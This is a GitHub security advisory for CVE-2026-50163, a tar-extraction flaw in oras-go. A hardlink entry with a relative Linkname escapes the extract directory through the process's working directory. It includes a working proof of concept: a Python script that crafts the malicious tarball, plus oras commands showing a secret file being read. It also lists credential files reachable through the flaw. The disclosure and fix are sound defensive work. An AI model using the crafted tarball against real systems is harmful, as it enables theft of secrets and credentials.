# [H] `oras-go` tar extraction: Hardlink entry with relative Linkname escapes extract dir via process CWD resolution

## Summary
Severity: High
Advisory: GHSA-fxhp-mv3v-67qp
CVE: CVE-2026-50163
CWE: CWE-22, CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-07-01
Source: https://github.com/advisories/GHSA-fxhp-mv3v-67qp
Type: github-advisory

## Affected
- Go: `oras.land/oras-go/v2` — affected >=0 <2.6.2

## Details
### Root cause

The tar-extraction helper `ensureLinkPath` at [`content/file/utils.go:262-275`](https://github.com/oras-project/oras-go/blob/main/content/file/utils.go#L262-L275) validates that a hardlink's target resolves inside the extract base, but then returns the original unresolved `target` string back to the caller:

```go
func ensureLinkPath(baseAbs, baseRel, link, target string) (string, error) {
    path := target
    if !filepath.IsAbs(target) {
        path = filepath.Join(filepath.Dir(link), target)  // resolved FOR VALIDATION
    }
    if _, err := resolveRelToBase(baseAbs, baseRel, path); err != nil {
        return "", err
    }
    return target, nil   // <-- returns the ORIGINAL target, not the validated path
}
```

The caller for `TypeLink` hardlinks then does:

```go
case tar.TypeLink:
    var target string
    if target, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname); err == nil {
        err = os.Link(target, filePath)
    }
```

`os.Link(oldname, newname)` wraps the `link(2)` system call. From the `link(2)` man page:

> oldpath and newpath are interpreted relative to the current working directory of the calling process.

So when `target` (i.e., `header.Linkname`) is a **relative** path, `os.Link` resolves it against the process's **current working directory**, not against `filepath.Dir(link)` as the validation assumed.

### Attack

An attacker who controls an OCI-compliant registry (or any artifact source the victim consumes via `oras pull`) crafts a tarball layer with:

- A regular file: `payload.tar.gz/README.txt`.
- A hardlink entry: `Typeflag=TypeLink`, `Name=payload.tar.gz/evil_cwd_link`, `Linkname="victim.secret"` (relative).

and marks the layer descriptor with `io.deis.oras.content.unpack: "true"` (a standard annotation that tells `oras-go` to auto-extract).

When a victim runs `oras pull` (or any Go code using `content.File`), the extraction:

1. Validates `payload.tar.gz/evil_cwd_link` — passes.
2. Calls `ensureLinkPath(dirPath, "payload.tar.gz", filePath, "victim.secret")`:
   - `path = filepath.Join(filepath.Dir(filePath), "victim.secret")` = `<extract_base>/payload.tar.gz/victim.secret` → inside base → **validation passes**.
   - Returns `target = "victim.secret"` (NOT `path`).
3. Calls `os.Link("victim.secret", "<extract_base>/payload.tar.gz/evil_cwd_link")`.
4. `link(2)` resolves relative `oldname="victim.secret"` against process CWD → creates a hardlink inside the extract tree pointing to `<invoker_CWD>/victim.secret`.

The resulting hardlink and the CWD file **share an inode** — reading one reads the other; writing to one writes to the other.

---

## Proof of Concept

Tested on Ubuntu 24.04.4 LTS with `oras` CLI v1.3.0 (SHA-256 `040e140304b7dbdd9b40dacd798e2303cea44ad84eeb210750afdf15f1dcf8b4`, downloaded from <https://github.com/oras-project/oras/releases/download/v1.3.0/oras_1.3.0_linux_amd64.tar.gz>).

Reproduction script (standalone, ~50 lines) attached. Summary of key steps:

```bash
# 1. Place victim file in the future CWD.
mkdir -p cwd-space extract
echo "TOP SECRET FROM CWD" > cwd-space/victim.secret

# 2. Craft malicious tarball with a TypeLink entry whose Linkname is RELATIVE.
python3 -c '
import tarfile, io, os
with tarfile.open("cwd-space/payload.tar.gz", "w:gz", format=tarfile.GNU_FORMAT) as t:
    info = tarfile.TarInfo(name="payload.tar.gz/README.txt")
    c = b"pulled from registry"; info.size = len(c); info.mode = 0o644
    info.uid = os.getuid(); info.gid = os.getgid()
    t.addfile(info, io.BytesIO(c))

    link = tarfile.TarInfo(name="payload.tar.gz/evil_cwd_link")
    link.type = tarfile.LNKTYPE
    link.linkname = "victim.secret"   # RELATIVE
    link.mode = 0o644; link.uid = os.getuid(); link.gid = os.getgid()
    t.addfile(link)
'

# 3. Push to OCI layout, patch in the unpack annotation, pull from cwd-space.
(cd cwd-space && oras push --oci-layout ../layout:v1 \
    payload.tar.gz:application/vnd.oci.image.layer.v1.tar+gzip)
# ... patch layout/blobs/sha256/<manifest> to add
#     io.deis.oras.content.unpack: "true" on layers[0].annotations ...

(cd cwd-space && oras pull --oci-layout ../layout:v1 --output ../extract)

# 4. Observe inode sharing.
stat -c '%i' extract/payload.tar.gz/evil_cwd_link   # → 6554160
stat -c '%i' cwd-space/victim.secret                # → 6554160 (SAME)
cat extract/payload.tar.gz/evil_cwd_link             # → "TOP SECRET FROM CWD"
```

Observed output:

```
evil_cwd_link (inside extract dir): inode=6554160
victim.secret  (in invoker CWD):    inode=6554160
*** ESCAPE CONFIRMED ***
Reading through the extract-dir hardlink yields the CWD file contents:
TOP SECRET FROM CWD
```

A library-level regression test is also provided (`poc_test.go`) that drops into `content/file/utils_test.go` and runs via `go test ./content/file/... -run TestPoC` — output shows identical inode match for consumers of the library API.

---

## Impact

**Primary: arbitrary-CWD-file read primitive.** An attacker-controlled OCI artifact, when pulled by a victim using the `oras` CLI or any Go program using `oras-go/v2/content/file`, can create a hardlink inside the victim's extract tree pointing to an arbitrary file in the victim's process CWD (that the invoker UID is permitted to read). Reading the extract-tree hardlink yields that file's contents verbatim.

**Secondary: inode-sharing tampering primitive.** Any tool that later modifies the extract-tree hardlink (write, chmod, truncate, etc.) modifies the CWD file through the shared inode. This violates the "writes inside the extract dir are confined" invariant that downstream tooling (CI systems, container-image builders, artifact scanners) typically depends on.

**High-severity chains:**

- **CI pipelines** where `oras pull` runs from a project workspace containing secrets/credentials (`.env`, `.git/config`, service-account tokens). The pulled artifact can hardlink those secrets into a location later archived/mounted/published.
- **Container orchestration** where the extract dir is bind-mounted into a lower-trust container while the pull-invoker's CWD is higher-trust. Hardlinks created in the extract tree expose invoker-CWD files across the trust boundary.
- **Kubernetes operators / Flux source-controller** using `oras-go` to fetch artifacts; their CWD is typically `/` or `/root` — very sensitive.
- **Multi-tenant registry proxies** that use `oras-go` to fetch and re-serve artifacts; each proxy process has a CWD with configuration, keys, or per-tenant state.

**Not affected:**

- `oras push` (tarball creation side): `tarDirectory` in the same file explicitly skips hardlink generation (line 65 comment: `"We don't support hard links and treat it as regular files"`), so pushed content cannot trigger this on the server.
- Symlink extraction path (`TypeSymlink`): `os.Symlink` stores the target string verbatim and does not CWD-resolve at creation time. The current `ensureLinkPath` return-of-`target` is correct for symlinks (the existing validation correctly models the symlink-follow path).

### Attack-surface boundary (`fs.protected_hardlinks`)

On Linux with `fs.protected_hardlinks=1` (default on modern distros), `link(2)` additionally requires the linking user to have READ + WRITE permission on the source file (per `may_linkat()` in the kernel). Verified on Ubuntu 24.04: as non-root, `ln /etc/passwd /tmp/x` returns `EPERM`, and the same via the oras PoC path returns `link passwd /tmp/.../evil_passwd: operation not permitted`.

**So the attacker cannot use this bug to read arbitrary root-owned files (e.g., `/etc/shadow`) when the victim invokes `oras pull` as a regular user.** The attack surface depends on the invocation context:

| Invocation context | Reachable file classes |
|---|---|
| `oras pull` run by a regular user | Any file the user OWNS or has write access to in the process CWD: `.env`, `.git/config`, `.aws/credentials`, `~/.ssh/config`, project-local secrets, CI workspace files. |
| `oras pull` run as root (systemd without `User=`, container entrypoint default root, Kubernetes operator) | **Every file on the host filesystem.** `/etc/shadow`, `/root/.ssh/id_rsa`, bind-mounted host paths, service private keys. |

The user-context attack surface alone is sufficient for supply-chain-grade impact: CI pipelines and developer machines routinely hold API keys, signing keys, and cloud credentials in user-owned files in the working directory. The root-context escalation makes the bug Critical in mainstream Kubernetes/GitOps tooling where oras-go is adopted for artifact distribution.

---

## Proposed fix

Change `ensureLinkPath` to expose both the verbatim target (for symlinks) and the resolved absolute path (for hardlinks); have the `TypeLink` case use the resolved path.

```go
// Current behavior preserved for TypeSymlink. TypeLink switches to the resolved
// path to avoid CWD-resolution mismatch at os.Link time.
func ensureLinkPath(baseAbs, baseRel, link, target string) (symlinkTarget, hardlinkPath string, err error) {
    path := target
    if !filepath.IsAbs(target) {
        path = filepath.Join(filepath.Dir(link), target)
    }
    if _, err = resolveRelToBase(baseAbs, baseRel, path); err != nil {
        return "", "", err
    }
    return target, path, nil
}
```

```go
case tar.TypeLink:
    var absTarget string
    if _, absTarget, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname); err == nil {
        err = os.Link(absTarget, filePath)
    }
case tar.TypeSymlink:
    var symTarget string
    symTarget, _, err = ensureLinkPath(dirPath, dirName, filePath, header.Linkname)
    if err != nil { return err }
    if err = os.Symlink(symTarget, filePath); err != nil { ... }
```

**Regression test to add:**

Extend `Test_extractTarDirectory_HardLink` with a third sub-test that:
1. Creates a sentinel file in the test's `t.TempDir()` (or an explicitly `os.Chdir`-entered directory) with a known name, e.g. `sentinel.txt`.
2. Builds a tarball containing a `TypeLink` entry with `Linkname: "sentinel.txt"` (relative).
3. Extracts.
4. Asserts either `extractTarDirectory` returned an error, OR the resulting hardlink's inode does NOT match the sentinel's inode.

## References
- https://github.com/oras-project/oras-go/security/advisories/GHSA-fxhp-mv3v-67qp
- https://nvd.nist.gov/vuln/detail/CVE-2026-50163
- https://github.com/oras-project/oras-go/pull/1232
- https://github.com/oras-project/oras-go/commit/b11f777f8d405c5023c4b307cfdc5068dfc3d406
- https://github.com/oras-project/oras-go/commit/c463c654ab3ef34422c1764cd619806cebf20451
- https://github.com/oras-project/oras-go
- https://github.com/oras-project/oras-go/releases/tag/v2.6.2
